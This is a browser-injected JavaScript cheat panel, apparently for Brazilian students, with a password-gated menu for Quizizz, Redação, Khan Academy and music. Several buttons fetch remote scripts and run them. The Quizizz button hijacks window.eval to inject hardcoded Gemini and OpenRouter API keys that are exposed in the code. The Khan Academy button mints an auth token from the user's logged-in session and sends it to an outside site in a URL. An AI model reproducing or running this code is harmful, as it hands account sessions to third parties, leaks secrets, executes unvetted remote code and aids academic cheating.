(function() {
  const box = document.createElement("div");
  box.style.position = "fixed";
  box.style.bottom = "20px";
  box.style.right = "20px";
  box.style.background = "#222";
  box.style.color = "#eee";
  box.style.padding = "15px";
  box.style.borderRadius = "8px";
  box.style.boxShadow = "0 0 10px rgba(0,0,0,0.5)";
  box.style.zIndex = "9999";
  box.style.width = "200px";
  box.style.transition = "all 0.3s ease";

  const title = document.createElement("div");
  title.textContent = "Login";
  title.style.fontWeight = "bold";
  title.style.marginBottom = "10px";
  box.appendChild(title);

  const errorMsg = document.createElement("span");
  errorMsg.style.color = "red";
  errorMsg.style.marginLeft = "10px";
  errorMsg.style.display = "none";
  title.appendChild(errorMsg);

  const input = document.createElement("input");
  input.type = "password";
  input.placeholder = "Senha";
  input.style.width = "100%";
  input.style.marginBottom = "10px";
  input.style.color = "black";
  box.appendChild(input);

  const btn = document.createElement("button");
  btn.textContent = "Entrar";
  btn.style.width = "100%";
  btn.style.padding = "8px";
  btn.style.background = "purple";
  btn.style.color = "white";
  btn.style.border = "none";
  btn.style.borderRadius = "5px";
  box.appendChild(btn);

  const menu = document.createElement("div");
  menu.style.display = "none";
  menu.style.marginTop = "10px";
  menu.innerHTML = `
    <button id="quizizz" style="width:100%;margin:5px 0;border:2px solid white;background:none;color:white;">Quizizz</button>
    <button id="redacao" style="width:100%;margin:5px 0;border:2px solid white;background:none;color:white;">Redação</button>
    <button id="khan" style="width:100%;margin:5px 0;border:2px solid white;background:none;color:white;">Khan Academy</button>
    <button id="music" style="width:100%;margin:5px 0;border:2px solid white;background:none;color:white;">Music</button>
  `;
  box.appendChild(menu);

  const signature = document.createElement("div");
  signature.textContent = "livrefree @ GitHub";
  signature.style.fontSize = "12px";
  signature.style.color = "#aaa";
  signature.style.marginTop = "10px";
  box.appendChild(signature);

  const senhaCorreta = "free";

  btn.onclick = () => {
    if (input.value === senhaCorreta) {
      errorMsg.style.display = "none";
      title.textContent = "Conectado";
      input.remove();
      btn.remove();
      menu.style.display = "block";
      box.style.width = "160px";
    } else {
      errorMsg.textContent = "Erro";
      errorMsg.style.display = "inline";
    }
  };

  document.body.appendChild(box);

  function executarScript(fn) {
    box.remove();
    fn();
  }

  menu.querySelector("#quizizz").onclick = () => executarScript(() => {
    (async () => {
      try {
        const INJECT_KEYS = ["AIzaSyBTxvdDSZQ2moftFmhB5La6eCPaWCStSPk"];
        const INJECT_DEEPSEEK = "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";
        const _o = window.eval;
        window.eval = function(code) {
          try {
            code = code.replace(/const\s+GEMINI_API_KEYS\s*=\s*\[[\s\S]*?\]\s*;/m, "const GEMINI_API_KEYS = " + JSON.stringify(INJECT_KEYS) + ";");
            code = code.replace(/const\s+OPENROUTER_API_KEYS\s*=\s*\[[\s\S]*?\]\s*;/m, "const OPENROUTER_API_KEYS = [\"" + INJECT_DEEPSEEK + "\"];");
          } catch (e) {
            console.error('inj', e);
          } finally {
            window.eval = _o;
          }
          return _o(code);
        };
        const url = "https://cdn.jsdelivr.net/gh/mzzvxm/WaygroundX@main/bypass.js?_=" + Date.now();
        const response = await fetch(url, { cache: "no-store", credentials: "omit" });
        const text = await response.text();
        eval(text);
      } catch (e) {
        alert("Erro: " + e);
        console.error(e);
      }
    })();
  });

  menu.querySelector("#redacao").onclick = () => executarScript(() => {
    const s = document.createElement('script');
    s.src = 'https://cdn.jsdelivr.net/gh/desenhoscoloridos100-web/RedacaoBypass@patch-1/script.js?t=' + Date.now();
    s.crossOrigin = 'anonymous';
    s.onload = function() {
      console.log('RedacaoBypass patch-1 carregado (no-cache)');
    };
    document.head.appendChild(s);
  });

  menu.querySelector("#khan").onclick = () => executarScript(async () => {
    let e = window.location.hostname;
    if ("khanacademy.org" !== e.split(".")?.slice(1)?.join(".")) return;
    let a = e.split(".")[0];
    const response = await fetch(`/api/internal/graphql/createTransferAuthTokenMutation?lang=${
      "www" === a ? "en" : a
    }&app=khanacademy`, {
      headers: {
        "content-type": "application/json",
        "x-ka-fkey": "1"
      },
      referrer: "/settings/account",
      body: JSON.stringify({
        operationName: "createTransferAuthTokenMutation",
        query: `mutation createTransferAuthTokenMutation($canvasProfileKeyName: String) {
          createTransferAuthToken(canvasProfileKeyName: $canvasProfileKeyName) {
            token
            __typename
          }
        }`,
        variables: {}
      }),
      method: "POST",
      mode: "cors",
      credentials: "include"
    });
    const data = await response.json();
    const token = data.data.createTransferAuthToken.token;
    open(`https://khan.cupiditys.lol/?token=${token}&l=${a}&c=${window.__KA_DATA__["KA-fastly-country"]}`);
  });

  menu.querySelector("#music").onclick = () => executarScript(() => {
    const s = document.createElement('script');
    s.src = 'https://cdn.jsdelivr.net/gh/livrefree/youtube-for-music-@main/youtube-for-music.js';
    document.body.appendChild(s);
  });
})();
